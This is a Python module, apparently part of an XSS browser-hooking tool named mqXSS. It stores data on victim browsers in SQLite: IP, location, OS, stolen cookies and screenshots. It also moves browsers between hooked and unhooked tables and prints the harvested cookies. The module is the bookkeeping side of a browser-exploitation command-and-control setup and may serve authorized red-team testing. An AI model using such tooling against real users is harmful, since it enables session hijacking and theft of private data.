import sqlite3
import pandas as pd
from datetime import datetime
from rich import print
import re
import os

dbfile = (os.path.dirname(os.path.realpath(__file__))+"/mqxss.db")
conn = sqlite3.connect(dbfile)
cursor = conn.cursor()
pd.set_option('display.max_rows', None)
pd.set_option('display.max_columns', None)
pd.set_option('display.width', 1000)
pd.set_option('display.colheader_justify', 'center')
pd.set_option('display.precision', 2)
pd.set_option('display.max_colwidth', 35)
pd.set_option('display.expand_frame_repr', True)

#create tables if not exist
def chooked():
	conn = sqlite3.connect(dbfile)
	cursor = conn.cursor()
	cursor.execute("CREATE TABLE IF NOT EXISTS hooked (ID INTEGER PRIMARY KEY AUTOINCREMENT, Agent TEXT, IP TEXT, Location TEXT, Cookies TEXT, UA TEXT, OS TEXT, Screenshot TEXT, Broker TEXT, LastSeen TEXT)")
	conn.commit()
	conn.close()
def cunhooked():
	conn = sqlite3.connect(dbfile)
	cursor = conn.cursor()
	cursor.execute("CREATE TABLE IF NOT EXISTS unhooked (ID INTEGER PRIMARY KEY AUTOINCREMENT, Agent TEXT, IP TEXT, Location TEXT, Cookies TEXT, UA TEXT, OS TEXT, Screenshot TEXT, Broker TEXT, LastSeen TEXT)")
	conn.commit()
	conn.close()
	
#add initial hooked info
def addhook(infos, mbroker, mport, mtopic):
	Agent = re.search(r'(.*?)\: XSS', infos).group(1)
	Location = re.search(r'Location\:(.*?)IP\:', infos).group(1)
	IP = re.search(r'IP\:(.*?)OS\:', infos).group(1)
	OS = re.search(r'OS\:(.*?)UA\:', infos).group(1)
	UA = infos.split("UA:",1)[1]
	broker = mbroker+":"+mport+"/"+mtopic
	dt1 = datetime.now()
	dt2 = dt1.strftime("%m/%d/%Y, %H:%M:%S")
	conn = sqlite3.connect(dbfile)
	cursor = conn.cursor()
	cursor.execute("""
	INSERT INTO hooked(Agent, IP, Location, UA, OS, Broker, LastSeen)
	VALUES (?,?,?,?,?,?,?)
	""", (Agent, IP, Location, UA, OS, broker, dt2))
	conn.commit()
	conn.close()
	
#add cookies
def addhook2(infos):
	Agent = re.search(r'(.*?)\: Cookies', infos).group(1)
	Cookies = infos.split("Cookies:",1)[1]
	conn = sqlite3.connect(dbfile)
	cursor = conn.cursor()
	conn.execute("UPDATE hooked set Cookies = ? where Agent = ?",(Cookies, Agent))
	conn.commit()
	conn.close()
	
#add screenshot
def addhook3(Agent, filename):
	conn = sqlite3.connect(dbfile)
	cursor = conn.cursor()
	conn.execute("UPDATE hooked set Screenshot = ? where Agent = ?", (filename, Agent))
	conn.commit()
	conn.close()

# get agent
def getagent(ID):
	conn = sqlite3.connect(dbfile)
	cursor = conn.cursor()
	agentret = pd.read_sql('SELECT Agent FROM hooked where ID = ?', conn, params=(ID,))
	df_empty = pd.DataFrame(agentret)
	if df_empty.empty:
		print("[[grey82]mqXSS[/grey82]] [grey89]No hooked browser with ID of "+ID+".[/grey89]")
		conn.close()
		return
	else:
		agentz = df_empty.to_string(header=False, index=False)
		return agentz
		conn.close()

# get location and cookie for browser
def getlocook(ID):
	conn = sqlite3.connect(dbfile)
	cursor = conn.cursor()
	locret = pd.read_sql('SELECT Location FROM hooked where ID = ?', conn, params=(ID,))
	cookret = pd.read_sql('SELECT Cookies FROM hooked where ID = ?', conn, params=(ID,))
	df_empty = pd.DataFrame(locret)
	df_empty2 = pd.DataFrame(cookret)
	if df_empty.empty:
		print("[[grey82]mqXSS[/grey82]] [grey89]No Location and Cookies with with ID of "+ID+".[/grey89]")
		conn.close()
		return
	else:
		getlocook.location = df_empty.to_string(header=False, index=False)
		getlocook.cookies = df_empty2.to_string(header=False, index=False)
		conn.close()

#display hooked
def gethooked():
	pd.set_option('display.max_colwidth', 35)
	conn = sqlite3.connect(dbfile)
	cursor = conn.cursor()
	hooked = pd.read_sql('SELECT ID, IP, Location, Cookies, UA, OS, Screenshot, Broker, LastSeen FROM hooked', conn, index_col=['ID'])
	df_empty = pd.DataFrame(hooked)
	if df_empty.empty:
		print("[[grey82]mqXSS[/grey82]] [grey89]No hooked browsers yet.[/grey89]")
		conn.close()
		return
	else:
		print("\n")
		print(hooked.head())
		print("\n")
		conn.close()
		
#move hooked to unooked
def remhook(infos):
	Agent = re.search(r'(.*?)\: Disconnected', infos).group(1)
	conn = sqlite3.connect(dbfile)
	cursor = conn.cursor()
	conn.execute("INSERT or IGNORE INTO unhooked SELECT * FROM hooked WHERE Agent = ?", [Agent])
	conn.execute("DELETE FROM hooked WHERE Agent = ?",[Agent])
	conn.commit()
	conn.close()

#move reconnected browser to hooked
def rechook(infos):
	Agent = re.search(r'(.*?)\: Reconnected', infos).group(1)
	conn = sqlite3.connect(dbfile)
	cursor = conn.cursor()
	conn.execute("INSERT or IGNORE INTO hooked SELECT * FROM unhooked WHERE Agent = ?", [Agent])
	conn.execute("DELETE FROM unhooked WHERE Agent = ?",[Agent])
	conn.commit()
	conn.close()

#get cookies
def monster():
	conn = sqlite3.connect(dbfile)
	cursor = conn.cursor()
	hooked = pd.read_sql('SELECT ID, Location, Cookies FROM hooked UNION SELECT ID, Location, Cookies FROM unhooked', conn, index_col=['ID'])
	conn.close()
	df_empty = pd.DataFrame(hooked)
	if df_empty.empty:
		print("[[grey82]mqXSS[/grey82]] [grey89]No cookies yet.[/grey89]")
		conn.close()
		return
	else:
		pd.set_option('display.colheader_justify', 'left')
		pd.set_option('display.max_colwidth', None)
		print("\n")
		print(hooked.head())
		print("\n")
		conn.close()

#display unhooked
def getunhooked():
	conn = sqlite3.connect(dbfile)
	cursor = conn.cursor()
	unhooked = pd.read_sql('SELECT ID, IP, Location, Cookies, UA, OS, Screenshot, Broker, LastSeen FROM unhooked', conn, index_col=['ID'])
	df_empty = pd.DataFrame(unhooked)
	if df_empty.empty:
		print("[[grey82]mqXSS[/grey82]] [grey89]No unhooked browsers yet.[/grey89]")
		conn.close()
		return
	else:
		print("\n")
		print(unhooked.head())
		print("\n")
		conn.close()
